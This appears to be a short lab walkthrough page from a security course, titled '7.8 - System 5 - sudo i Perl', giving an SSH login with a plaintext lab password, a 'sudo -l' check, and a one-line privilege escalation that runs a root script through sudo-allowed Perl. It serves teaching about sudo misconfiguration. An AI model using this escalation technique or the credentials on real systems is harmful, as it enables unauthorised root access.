---
title: "7.8 - System 5 - sudo i Perl"
order: 8
---

```bash
ssh system5@192.168.100.107 -p 2205 #Password: pjatk
sudo -l #Check allowed commands
sudo /usr/bin/perl -e 'system("/root/solve");' #Run as root
```
